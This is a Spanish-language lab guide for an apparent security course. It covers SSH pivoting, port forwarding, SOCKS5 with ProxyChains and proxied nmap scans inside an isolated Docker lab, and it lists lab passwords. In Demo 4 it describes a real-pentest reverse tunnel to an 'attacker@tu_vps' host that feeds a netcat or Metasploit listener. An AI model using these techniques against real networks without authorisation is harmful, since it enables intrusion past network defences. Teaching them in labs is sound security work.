# Lab SSH — Pivoting, Port Forwarding y SOCKS5
**CyberKnight · Video 07 · Guía de laboratorio**

---

## Arquitectura del lab

```
                    RED EXTERNA (172.28.0.0/24)
  ┌────────────────────────────────────────────────┐
  │                                                │
  │  [atacante]              [servidor-dmz]        │
  │  172.28.0.100            172.28.0.10           │
  │  (tu shell de trabajo)   (el trampolín)        │
  │                               │                │
  └───────────────────────────────┼────────────────┘
                                  │  también en:
                    RED INTERNA (10.10.0.0/24)
  ┌───────────────────────────────┼────────────────┐
  │                          10.10.0.2             │
  │                               │                │
  │               ┌───────────────┴──────────┐     │
  │               │                          │     │
  │        [web-interno]              [db-interna]  │
  │          10.10.0.5:80              10.10.0.10   │
  │          (nginx)                   (MySQL)      │
  └────────────────────────────────────────────────┘

  atacante NO tiene interfaz en red_interna → aislamiento real
```

---

## Requisitos

```bash
# Verificar Docker y Compose
docker --version
sudo docker compose version
```

---

## Puesta en marcha

```bash
cd lab-ssh/

# Construir imágenes y levantar
sudo docker compose up -d --build

# Verificar los cuatro contenedores
sudo docker compose ps
```

Salida esperada:

```
NAME           STATUS
atacante       Up
dmz            Up
web_interno    Up
db_interna     Up
```

---

## ENTRAR AL CONTENEDOR ATACANTE

Todas las demos se hacen desde dentro del contenedor `atacante`.
Abrirlo una sola vez al inicio de la clase:

```bash
sudo docker exec -it atacante bash
```

A partir de aquí, **todos los comandos de las demos se ejecutan dentro de este shell**.

---

## PASO 0 — Verificar el aislamiento (hacer esto delante de los alumnos)

```bash
# Dentro del contenedor atacante:

# SÍ llegamos al DMZ (misma red)
ping -c 2 172.28.0.10

# NO llegamos a la red interna — sin ruta
ping -c 2 10.10.0.5
curl --max-time 2 http://10.10.0.5 || echo "SIN ACCESO — necesitamos pivoting"
```

> **Punto pedagógico:** el contenedor `atacante` solo existe en `red_externa`.
> No tiene interfaz en `10.10.0.0/24`, igual que un atacante externo que ha comprometido
> la DMZ pero no tiene acceso directo a la red interna.

---

## DEMO 1 — SSH básico y autenticación con claves

**Credenciales del DMZ:**
- Host: `172.28.0.10`
- Usuario: `pivot`
- Contraseña: `pivot123`

```bash
# Conexión con contraseña
ssh pivot@172.28.0.10
# Introducir: pivot123
exit

# Generar par de claves Ed25519
ssh-keygen -t ed25519 -C 'cyberknight-lab'
# Ruta por defecto: ~/.ssh/id_ed25519  |  Passphrase: vacía para el lab

# Copiar clave pública al servidor
ssh-copy-id pivot@172.28.0.10
# Pide la contraseña una última vez: pivot123

# Conectar sin contraseña
ssh pivot@172.28.0.10
exit

# Permisos correctos en la clave privada
chmod 600 ~/.ssh/id_ed25519
```

> Ed25519 es más corto, más rápido y más seguro que RSA-2048.
> Si el servidor solo acepta RSA, usar `-t rsa -b 4096`.

---

## DEMO 2 — Local Forwarding (-L) → Servidor Web

**Escenario:** `10.10.0.5:80` inaccesible desde el atacante. Lo tunelaremos a `localhost:8080`.

```
[atacante:8080] ---SSH tunnel---> [dmz:22] ---red interna---> [10.10.0.5:80]
```

```bash
# Terminal 1 — abrir el túnel (queda bloqueada mientras está activo)
ssh -L 8080:10.10.0.5:80 pivot@172.28.0.10

# Terminal 2 — abrir otro shell en el contenedor (desde el HOST, otra ventana):
sudo docker exec -it atacante bash

# Verificar desde Terminal 2
curl http://localhost:8080
# Debe mostrar: "PIVOTING EXITOSO"
```

> El tráfico sale de `localhost:8080`, viaja cifrado por SSH hasta el DMZ,
> y desde el DMZ llega a `10.10.0.5:80`. El atacante solo ve `localhost`.

### Múltiples túneles en el mismo comando

```bash
ssh -L 8080:10.10.0.5:80 -L 3307:10.10.0.10:3306 pivot@172.28.0.10
```

---

## DEMO 3 — Local Forwarding (-L) → Base de Datos MySQL

**Escenario:** `10.10.0.10:3306` inaccesible. Lo exponemos en `localhost:3307`.

> MySQL puede tardar ~30 segundos en arrancar. Verificar con:
> `sudo docker compose logs db | tail -3` — esperar "ready for connections".

```bash
# Terminal 1 — túnel
ssh -L 3307:10.10.0.10:3306 pivot@172.28.0.10

# Terminal 2 — conectar con el cliente MySQL
mysql -h 127.0.0.1 -P 3307 -u lab -plab123 labdb

SHOW DATABASES;
SELECT USER();
EXIT;
```

> Usamos el puerto `3307` localmente por si el `3306` ya está ocupado en el atacante.

---

## DEMO 4 — Remote Forwarding (-R)

**Escenario inverso:** un servicio del atacante accesible desde la red donde está el servidor comprometido.
Útil para reverse shells cuando el firewall bloquea conexiones entrantes.

```
[atacante:9090] <---SSH tunnel--- [dmz:9090]
```

```bash
# Terminal 1 — levantar servidor de prueba en el atacante
python3 -m http.server 9090

# Terminal 2 — crear el túnel inverso
ssh -R 9090:localhost:9090 pivot@172.28.0.10

# Terminal 3 — verificar desde dentro del DMZ
sudo docker exec -it dmz curl http://localhost:9090
# Responde con listado de ficheros del atacante
```

> En un pentest real: reemplaza `python3 -m http.server` por un listener de Metasploit o netcat.
> El servidor comprometido ejecuta `ssh -R 4444:localhost:4444 attacker@tu_vps`
> y tu listener recibe la conexión aunque el firewall bloquee el tráfico entrante.

---

## DEMO 5 — SOCKS5 Dinámico (-D) + ProxyChains

**El escenario más potente:** SSH actúa como proxy SOCKS5 completo hacia toda la red interna.

```
[herramienta] --proxychains--> [SOCKS5:1080] ---SSH---> [dmz] ---> [10.10.0.0/24]
```

```bash
# Paso 1 — crear el proxy SOCKS5 en background
ssh -D 1080 -N -f pivot@172.28.0.10

# Verificar que está corriendo
ps aux | grep "ssh -D"

# Paso 2 — verificar la configuración de ProxyChains
# (ya viene configurada en el contenedor atacante)
grep socks5 /etc/proxychains4.conf

# Paso 3 — usar herramientas a través del proxy
proxychains curl http://10.10.0.5/
proxychains nmap -sT -Pn -p 80,3306 10.10.0.5
proxychains nmap -sT -Pn -p 3306 10.10.0.10
```

> **Diferencia clave entre -L y -D:**
> `-L` reenvía un puerto concreto a un destino fijo.
> `-D` es proxy dinámico — cualquier herramienta, cualquier destino de la red interna.
>
> **Por qué `-sT -Pn` con nmap:** los SYN scans no funcionan a través de SOCKS5.
> TCP connect (`-sT`) sí funciona. `-Pn` evita el ping previo, que tampoco funciona por proxy.

---

## EJERCICIO FINAL — Para los alumnos

Cada alumno debe completar la siguiente secuencia desde cero:

```
1.  Entrar al contenedor atacante
2.  Generar un par de claves Ed25519 con el comentario "alumno-<tu_nombre>"
3.  Copiar la clave pública al servidor DMZ
4.  Verificar que la conexión SSH funciona sin contraseña
5.  Crear un local forwarding del puerto 80 de 10.10.0.5 a localhost:8080
6.  Verificar con curl que aparece la página del servidor interno
7.  Abrir un segundo túnel -L al puerto 3306 de 10.10.0.10
8.  Conectar con el cliente MySQL y ejecutar: SELECT VERSION();
9.  Levantar un proxy SOCKS5 en background en el puerto 1080
10. Usar proxychains nmap para descubrir los puertos de 10.10.0.5 y 10.10.0.10
```

**Solución de referencia:**

```bash
sudo docker exec -it atacante bash

ssh-keygen -t ed25519 -C "alumno-mario"
ssh-copy-id pivot@172.28.0.10
ssh pivot@172.28.0.10 "echo OK sin contraseña"

ssh -L 8080:10.10.0.5:80 pivot@172.28.0.10 &
curl http://localhost:8080

ssh -L 3307:10.10.0.10:3306 pivot@172.28.0.10 &
mysql -h 127.0.0.1 -P 3307 -u lab -plab123 -e "SELECT VERSION();"

ssh -D 1080 -N -f pivot@172.28.0.10
proxychains nmap -sT -Pn -p 22,80,3306 10.10.0.5 10.10.0.10
```

---

## Comandos de gestión del lab

```bash
# Ver estado
sudo docker compose ps

# Ver logs de un servicio
sudo docker compose logs dmz
sudo docker compose logs db

# Abrir shell en cualquier contenedor
sudo docker exec -it atacante bash
sudo docker exec -it dmz bash

# Reiniciar un servicio
sudo docker compose restart dmz

# Parar sin borrar
sudo docker compose stop

# Parar y borrar contenedores
sudo docker compose down

# Borrar todo incluyendo imágenes
sudo docker compose down --rmi all
```

---

## Solución de problemas

| Síntoma | Causa probable | Solución |
|---------|---------------|----------|
| `Connection refused` al SSH | DMZ aún arrancando | Esperar 5s y reintentar |
| `bind: Address already in use` | Puerto 1080 ocupado | `pkill -f "ssh -D"` dentro del atacante |
| `proxychains nmap` sin resultados | Usando SYN scan | Añadir `-sT -Pn` |
| MySQL no conecta | DB tardando en iniciar | `sudo docker compose logs db \| tail -5` |
| `REMOTE HOST IDENTIFICATION HAS CHANGED` | Se reconstruyó el DMZ | Ya configurado: `StrictHostKeyChecking no` |
| `Address already in use` al levantar | Conflicto de red Docker | `sudo docker compose down && sudo docker network prune -f` |

---

## Credenciales del lab

| Servicio | IP            | Puerto | Usuario | Contraseña |
|----------|---------------|--------|---------|------------|
| SSH DMZ  | 172.28.0.10   | 22     | pivot   | pivot123   |
| Web      | 10.10.0.5     | 80     | —       | —          |
| MySQL    | 10.10.0.10    | 3306   | lab     | lab123     |

---

## Resumen de comandos del vídeo

| Comando | Qué hace |
|---------|---------|
| `ssh usuario@ip` | Conexión SSH básica |
| `ssh-keygen -t ed25519` | Genera par de claves |
| `ssh-copy-id usuario@ip` | Instala clave pública en el servidor |
| `chmod 600 ~/.ssh/id_ed25519` | Permisos correctos clave privada |
| `ssh -L local:destino:puerto usuario@pivot` | Local forwarding |
| `ssh -R remoto:localhost:puerto usuario@pivot` | Remote forwarding |
| `ssh -D 1080 -N -f usuario@pivot` | Proxy SOCKS5 en background |
| `proxychains <comando>` | Enruta el tráfico por el proxy |
| `proxychains nmap -sT -Pn` | Escaneo de puertos a través de SOCKS5 |
